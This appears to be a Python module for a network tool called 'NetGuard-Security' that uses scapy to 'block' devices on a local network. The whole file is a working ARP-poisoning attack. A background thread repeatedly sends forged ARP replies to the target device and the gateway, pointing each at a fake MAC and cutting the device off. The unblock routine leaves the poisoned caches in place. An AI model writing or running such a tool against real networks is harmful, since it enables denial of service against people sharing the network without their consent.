import threading
import time
import logging
from scapy.all import ARP, send, conf
import asyncio

logger = logging.getLogger("NetGuard-Security")

class SecurityEngine:
    def __init__(self):
        self.blocking_tasks = {} # {target_ip: stop_event}
        self.gateway_ip = None
        self.interface = None
        self._lock = threading.Lock()

    def set_config(self, interface, gateway_ip):
        self.interface = interface
        self.gateway_ip = gateway_ip

    def start_blocking(self, target_ip, target_mac):
        """Starts a background thread to disrupt the connection of target_ip via ARP poisoning."""
        with self._lock:
            if target_ip in self.blocking_tasks:
                return False # Already blocking
            
            if not self.gateway_ip:
                logger.error("Cannot block: Gateway IP not set")
                return False

            stop_event = threading.Event()
            thread = threading.Thread(
                target=self._disruption_loop, 
                args=(target_ip, target_mac, stop_event),
                daemon=True
            )
            self.blocking_tasks[target_ip] = {"stop_event": stop_event, "thread": thread}
            thread.start()
            logger.warning(f"SECURITY: Started blocking device {target_ip}")
            return True

    def stop_blocking(self, target_ip):
        """Stops the disruption and attempts to restore the target's ARP cache."""
        with self._lock:
            if target_ip in self.blocking_tasks:
                task = self.blocking_tasks[target_ip]
                task["stop_event"].set()
                task["thread"].join(timeout=2)
                del self.blocking_tasks[target_ip]
                
                # Attempt to restore ARP cache (send correct info)
                # This requires knowing the real gateway MAC
                # For now, we rely on the device eventually fixing itself or broadcast
                logger.info(f"SECURITY: Stopped blocking device {target_ip}")
                return True
            return False

    def is_blocking(self, target_ip):
        with self._lock:
            return target_ip in self.blocking_tasks

    def _disruption_loop(self, target_ip, target_mac, stop_event):
        """Periodic ARP poisoning loop (Bidirectional)."""
        # Using a non-existent but valid-looking unicast MAC
        # 00:00:00:00:00:00 is sometimes ignored as invalid.
        FAKE_MAC = "00:0c:29:ab:cd:ef" 
        
        logger.info(f"Disruption loop started for {target_ip} using gateway {self.gateway_ip}")
        
        # Try to find gateway MAC if we don't have it (optional but better for unblocking)
        gateway_mac = "ff:ff:ff:ff:ff:ff" # Fallback to broadcast for poisoning
        
        while not stop_event.is_set():
            try:
                # 1. Poison Target: Tell target that Gateway is at FAKE_MAC
                # This stops target from sending data TO the gateway
                pkt_to_target = ARP(
                    op=2, 
                    pdst=target_ip, 
                    hwdst=target_mac, 
                    psrc=self.gateway_ip, 
                    hwsrc=FAKE_MAC
                )
                send(pkt_to_target, iface=self.interface, verbose=False)
                
                # 2. Poison Gateway: Tell Gateway that Target is at FAKE_MAC
                # This stops gateway from sending data TO the target
                pkt_to_gw = ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    psrc=target_ip,
                    hwsrc=FAKE_MAC
                )
                send(pkt_to_gw, iface=self.interface, verbose=False)
                
                time.sleep(1.5) # Slightly faster interval for persistence
            except Exception as e:
                logger.error(f"Disruption Error for {target_ip}: {e}")
                break
        logger.info(f"Disruption loop stopped for {target_ip}")

security_engine = SecurityEngine()
